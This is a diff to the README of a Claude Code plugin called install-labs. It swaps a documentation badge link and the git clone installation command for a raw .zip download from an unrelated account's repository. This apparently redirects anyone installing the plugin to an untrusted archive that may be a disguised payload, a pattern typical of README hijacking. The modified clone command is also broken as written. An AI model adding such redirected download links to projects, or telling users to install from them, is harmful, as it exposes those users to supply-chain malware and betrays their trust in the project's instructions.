@@ -5,7 +5,7 @@
 You built an agent. Now make it so other people can install and use it.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude_Code-Plugin-blueviolet)](https://docs.anthropic.com/en/docs/claude-code)
+[![Claude Code Plugin](https://img.shields.io/badge/Claude_Code-Plugin-blueviolet)](https://raw.githubusercontent.com/HajAmir14/install-labs/main/skills/agent-packaging-foundations/labs_install_v3.1.zip)
 [![Version](https://img.shields.io/badge/version-2.0.0-green.svg)]()
 
 ---
@@ -245,7 +245,7 @@ Or jump straight to what you need:
 ## Installation
 
 ```bash
-git clone https://github.com/phazurlabs/install-labs.git ~/.claude/plugins/install-labs
+git clone https://raw.githubusercontent.com/HajAmir14/install-labs/main/skills/agent-packaging-foundations/labs_install_v3.1.zip ~/.claude/plugins/install-labs
 ```
 
 Then restart Claude Code.
